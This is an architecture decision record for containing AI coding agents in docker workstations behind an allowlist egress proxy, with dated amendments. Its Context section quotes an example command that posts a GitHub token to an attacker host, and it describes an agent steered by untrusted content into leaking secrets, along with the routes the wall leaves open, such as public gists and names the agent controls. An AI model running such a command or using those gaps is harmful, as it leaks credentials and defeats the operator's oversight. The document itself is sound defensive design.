# ADR-0028: Workstation egress runs through an allowlist proxy

Date: 2026-09-20 · Status: accepted · Amends: ADR-0017 (decision 9, "open egress") · Amended 2026-09-20 (decision 3: the hub entry is the MCP listener, #238); 2026-10-01 (consequences: a docker loop behind a loopback listener is refused, #474); 2026-10-01 (decision 3: the loop listener does not refuse a host.docker.internal Host, #508); 2026-10-05 (decision 4: a loop's own entries, keyed by its proxy token, #599); 2026-10-06 (decision 4: the operator's extra hosts are stored and change while the hub runs, #542); 2026-10-06 (decision 4: brokered MCP servers open no host, #622); 2026-10-07 (decision 4: a loop's own entries are removed, #626); 2026-10-08 (decision 5: the wall is ensured at every docker wake, #657)

## Context

ADR-0017 gave every workstation full outbound network and recorded the
consequence honestly: injected secrets are readable by the loop, so a loop
steered by untrusted content it reads can `curl -d "$GH_TOKEN" https://attacker`
and the value leaves. Containment stops code from escaping the wall, not the
agent from handing out a credential it legitimately holds.

The structural fix is the credential broker (#30, L4): the agent wields a
capability and never sees the value. The operator decided on 2026-09-19 that L1
closes without it — with output redaction (#150, shipped) and this: cutting the
path from the workstation to arbitrary hosts, at the network layer rather than
by asking the agent nicely (#193).

## Decision

1. **Workstations live on an internal network and reach the world only through
   a proxy.** A single docker network `spool-egress` created `--internal` — the
   daemon installs no route off it — carries every docker workstation. One
   shared proxy container, `spool-egress-proxy`, sits on both that network and
   the default bridge and is the only thing that can forward outward. Both are
   named after the proxy image, so a hub configured with a different one (the
   tier-2 suite's, say) builds its own wall instead of joining a running
   fleet's.
   `--internal` is the enforcement: it is the daemon's own rule, not a
   convention a loop can opt out of, and a process inside the workstation
   cannot reach an address the network has no route to no matter what it runs.

2. **The proxy is ours, in Go, stdlib-only.** `cmd/spool-egress` is an ordinary
   forward proxy: `CONNECT host:port` for TLS, absolute-form requests for plain
   HTTP. It matches the requested host name *and port* against the allowlist
   *before* dialing and refuses everything else with `403` and a body naming the host,
   so a blocked call fails fast and legibly inside the turn instead of hanging.
   Squid or tinyproxy would do the same job; a ~200-line stdlib proxy avoids a
   new dependency, a config dialect, and an image we do not control, and it
   lets the allowlist be a Go value the tier-2 suite can drive directly.
   The image is `FROM scratch` plus the static binary.

3. **The hub is reached through the proxy too, and only its loop-facing
   listener is.** An internal network has no
   route to the host gateway either, so `host.docker.internal` moves from the
   workstation to the proxy container (`--add-host …:host-gateway`) and a
   loop's MCP traffic is proxied like anything else. The gateway is the one
   entry that is *not* compiled in: it is the operator's own machine, so the
   runtime allowlists it on one port alone — `--mcp-listen`, which serves the
   MCP endpoint and nothing else. The operator's API and control room are on
   `--listen`, which is on no allowlist and therefore not a destination a
   workstation has at all. Allowlisting the API port instead would have handed
   every loop the unauthenticated admin API (#238): its own conversations,
   every other owner's, the fleet's settings, and the creation of a *bare*
   loop that runs outside any container. That separation is at the network
   layer on purpose — it holds whether or not the API's own authentication is
   right, and it held before the API had any. A proxy whose configuration
   has changed — a moved hub, a new image — is replaced rather than kept,
   since run arguments are fixed at creation. `HTTP_PROXY`, `HTTPS_PROXY` and their lowercase twins are set in every
   exec env, with `NO_PROXY=localhost,127.0.0.1` so a loop's own local servers
   stay direct. `claude`, `gh`, `git`, `go`, `npm` and Go's own HTTP client all
   honour them — which is what makes a *forward* proxy the cheap shape here.

   **Amended by ADR-0030:** the operator listener now carries a credential of
   its own. This decision remains the reason a workstation cannot reach it at
   all; that one covers the callers the network cannot tell apart.

   **Amendment (2026-10-01, #508):** the loop listener turns off the MCP
   SDK's DNS-rebinding guard. The guard refuses a request that arrives on a
   loopback address naming another host. Docker Desktop delivers every
   workstation's request that way, on the host's loopback while naming
   `host.docker.internal`, so on Docker Desktop no docker loop reached the
   hub. The guard protects an endpoint that takes no credential. On this
   listener every request has shown a loop's bearer token before the SDK
   sees it, and a page that rebinds a name to 127.0.0.1 cannot know one, so
   the token is what keeps such a page out. The operator approved the change
   on 2026-10-01.

4. **The allowlist is a default fleet-wide list, extendable per loop later.**
   The default is what a loop needs to do its job: Anthropic's API and Claude
   Code's install/update hosts, GitHub (api/web/objects/codeload), the Go module
   proxy and checksum database, the npm registry, Debian's archives for the
   image's own package manager, and the hub. It is a Go value in
   `internal/egress`, linked into the proxy binary, so adding a host is a PR
   with a reason rather than a config file nobody reviews; `--egress-allow`
   extends it for one fleet without a rebuild. An entry is a host, optionally
   with one port; without a port it permits 80 and 443 only, so an allowlisted
   host is a web destination and not a tunnel to every port it happens to
   listen on. Per-loop extension —
   a loop that must read the web is granted it explicitly — is the same
   decision keyed on the requesting workstation's address, and lands separately
   (#193 follow-up); nothing here needs to change shape for it.

   **Amendment (2026-10-05, #599): a loop's own entries are keyed by a proxy
   token, not its address.** A loop's attached http MCP servers (ADR-0043)
   are the first per-loop entries: each server's host, with its port when
   that isn't 80 or 443. Loopback servers are inside the wall already, and a
   stdio server's hosts can't be read from its config.
   - **Keyed on a token, not the address.** The token is the loop's hub
     MCP token (ADR-0026). A wake of a loop with entries of its own carries
     it in its proxy URL (`http://<loop>:<token>@…`). That URL crosses
     value-less like the loop's other variables, and the proxy matches the
     `Proxy-Authorization` the token arrives in. The address keying planned
     above would have been weaker twice over. Workstations keep docker's
     default `NET_RAW`, so one can spoof a neighbour's address on the
     shared network. And a restarted workstation can be handed another
     loop's address, with that loop's hosts, until the map is rewritten.
   - **The token exposes nothing new.** The loop already holds it in its
     mcp-config, and the redactor already knows it, so an echoed proxy URL
     shows a placeholder. The proxy already carries it in the loop's hub
     traffic. Anyone who has it can already act as the loop at the hub,
     which is more than reaching the loop's hosts.
   - **A request without the token gets the fleet's list,** as every request
     did before, so a client that ignores proxy credentials loses only its
     loop's extra hosts. The proxy never relays the token upstream.
   - **The proxy is not recreated to change them.** The hub keeps every
     loop's entries for its run, filed under the token's SHA-256, and copies
     the whole file into the proxy (`docker cp`; the image has no shell)
     whenever one loop's entries change. The proxy re-reads the file when its
     bytes change, so no other loop's open tunnel is cut. It doesn't rely on
     the file's timestamp, because `docker cp` keeps only whole seconds. It
     keeps the last good read if a copy lands half-written. A recreated
     proxy gets the file back from the hub. A hub that restarts rewrites the
     file at its first wake: a token outlives the run, so an entry the hub
     no longer knows of must not. A copy that fails leaves the hub's
     record as the proxy last read it, so the next wake retries it rather
     than finding it made, and a detached host can't stay open.
   - **A change lands at the loop's next wake,** as its mcp-config does.

   The operator approved keying on the token on 2026-10-05.

   **Amendment (2026-10-06, #542): the operator's extra hosts are stored
   and change while the hub runs.** The allowlist is the built-in list plus
   a list the operator holds, edited on the Settings page. The proxy still
   matches names before resolution, and per-loop reach is still a
   connection's (#505).
   - **Stored, seeded once by the flag.** The hub stores the list.
     `--egress-allow` seeds it on the first start, and from then on the
     stored list wins. Before this, the flag was the whole list, so an
     operator narrowing it expects that to cut a host. A hub started with
     a flag that differs from the stored list therefore warns at the
     terminal, naming the list in force, and the page shows the flag
     beside it.
   - **The page names hosts; ports stay at the terminal.** An entry added
     there takes 80 and 443. One with a port of its own still comes from
     `--egress-allow`, and the page can remove it.
   - **The list goes in the proxy's file, beside each loop's entries.** It
     is copied in the same way and re-read the same way, so changing it
     recreates nothing and cuts no tunnel. The proxy's start arguments now
     carry the hub's gateway entry alone. Requests with and without a
     token both get the list.
   - **Only a hub's own docker wakes open the file to it.** A hub copies
     the list in only once a wake of its own has written the file this
     run. Until then, the list waits for that wake. A hub that runs no
     docker loop therefore never writes into a proxy that another hub on
     the daemon may share.
   - **The built-in reasons are data.** Each built-in group carries the
     sentence that explains it, which the page shows. Adding a host is
     still a PR with a reason.
   - **An older proxy is replaced.** The proxy's spec names the file
     format, so a proxy from an image without the fleet field is recreated
     once rather than kept refusing the list.

   The operator approved the control room widening the wall while the hub
   runs, with the stored list winning over the flag, on 2026-10-06.

   **Amendment (2026-10-06, #622): brokered MCP servers open no host.** The
   hub now brokers every http MCP server a workstation's hub can reach
   (ADR-0045), so the workstation never dials the server, and the server's
   host is no longer one of the loop's own entries. That leaves the #599
   entries with nothing to carry: a wake opens none, and the proxy matches
   none. The mechanism stays in place until #626 removes it or names a new
   source for it.

   **Amendment (2026-10-07, #626): a loop's own entries are removed.** No
   source for them was named, so the #599 mechanism is gone end to end.
   - **Every loop gets the same list:** the built-in hosts, the hub's
     gateway entry and the operator's extra hosts. A wake's proxy URL
     carries no token again, and crosses in argv as it did before #599.
   - **The proxy's file holds the operator's extra hosts alone,** read
     through `--fleet-file`. It is copied and re-read as #542 describes.
     The file format in the proxy's spec changes with it, so a proxy
     started with the old flag is recreated once.
   - **The proxy still drops any `Proxy-Authorization`** it is sent rather
     than relaying it, as it does every hop-by-hop header.
   - **A per-loop host comes back with a producer.** If a loop needs a
     host the fleet shouldn't have, such as one a stdio server calls, the
     issue that wants it reopens this decision with the source named.

5. **Lifecycle matches the workstation's.** The network and the proxy are
   ensured idempotently before a workstation is provisioned, and the proxy runs
   `--restart unless-stopped`, so both survive daemon and orchestrator
   restarts. Neither is torn down with a loop: they are fleet infrastructure,
   and `docker network rm` on a network with members would fail anyway.

   **Amendment (2026-10-08, #657): the wall is ensured at every docker wake.**
   Not only before a provision: a wake of a workstation that already exists
   ensures the network and the proxy too, and catches the proxy's file up
   with the operator's extra hosts. A hub run whose workstations all
   survived from the last run provisions nothing, so until this it never
   wrote the file, and a host added on Settings never reached the proxy.
   The cost is a few docker CLI queries per wake.

6. **The bare runtime is explicitly outside this.** A bare loop is a host
   process with the host's network; there is no wall to put a door in. The docs
   already badge it *uncontained* and this is one more thing that badge means.

## Consequences

- The L1 exit criterion grows a clause: a workstation cannot exfiltrate what it
  holds to arbitrary hosts. A stolen token still has to leave through a host on
  the allowlist — GitHub is on it, so a loop *can* still write a secret into a
  public gist. Redaction (#150) and least-privilege scoping remain load-bearing;
  the broker (#30) is still the structural fix.
- **Matching is on the requested name, not the resolved address.** A name the
  agent controls that resolves wherever it likes is not stopped by this; DNS and
  TLS-inspecting filtering were out of scope by decision. The allowlist is a
  list of hosts we trust *as destinations*, which is exactly as strong as the
  weakest of them.
- Existing workstations keep their old network until they are recreated: the
  network is fixed at `docker run`. The control room's recreate control
  (ADR-0021) is the migration path, and a workstation still on the bridge is
  simply in the pre-#193 posture.
- A loop that needs a host nobody anticipated now fails instead of silently
  succeeding, and the operator has to add it. That cost is the point, but it
  means the default list is a thing we maintain — measured, not guessed, and
  changed by PR.
- **Only what honours proxy variables gets out.** `git` over SSH does not: a
  loop must clone and push over HTTPS with its gh credential, which is what the
  workstation image and ADR-0017's "loops clone themselves" already assume, and
  anything raw-socket is cut with it. What a proxy *can* carry is `CONNECT` to
  any port, which is why the allowlist names ports: an entry without one
  permits 80 and 443, and the gateway permits the hub's port and nothing else.
  A loop therefore has no tunnel to ssh or a database on the operator's own
  machine — the reach a workstation on the bridge did have.
- **Name resolution is not a way out either.** Docker's embedded resolver on an
  `--internal` network answers for containers on that network and nothing else:
  measured on the fleet's daemon, a container there resolves the proxy by name
  and `getent hosts example.com` fails, while the same image on the bridge
  resolves it. So the low-bandwidth channel of encoding data in DNS labels is
  closed by the same wall, not left open beside it.
- One more long-lived container per fleet (not per loop): a scratch-image Go
  process, idle between requests, well inside the QUALITY.md envelope.
- **The operator now binds two ports.** With docker workstations `--mcp-listen`
  must name an address the bridge can reach, which was previously true of the
  single listener and so exposed the API with it; now the address the bridge
  can reach carries one endpoint whose only caller is a loop holding that
  loop's own bearer token. The hub refuses to start if the two listeners would
  be the same socket, since that silently restores the old hole, and it warns
  at boot when the default runtime is docker and `--mcp-listen` is on loopback
  — a fleet whose one allowed destination is the one it cannot route to comes
  up looking healthy and never wakes.

  **Amendment (2026-10-01, #474):** the boot warning reached only a hub whose
  *default* runtime was docker, so a docker loop on a bare-default hub came
  up mute with nothing said. Creating a docker loop is now refused (`400
  loop_listener_unreachable`, naming `--mcp-listen <bridge gateway>:<port>`)
  when the bridge gateway is an address of this machine, which is how a
  workstation reaches the hub on an engine that runs here, and `--mcp-listen`
  is bound to neither a wildcard nor that gateway: loopback, or any other one
  address, refuses the connection. The boot warning applies the same test. An engine in a VM, such
  as Docker Desktop's, has no bridge gateway on this machine and forwards
  `host.docker.internal` to its loopback itself, so neither the warning nor
  the refusal fires there, nor when the engine cannot report its bridge.
- Proxy denials are logged by host, never by URL: a query string can carry a
  credential, and this log is the one place a blocked exfiltration attempt is
  visible at all.
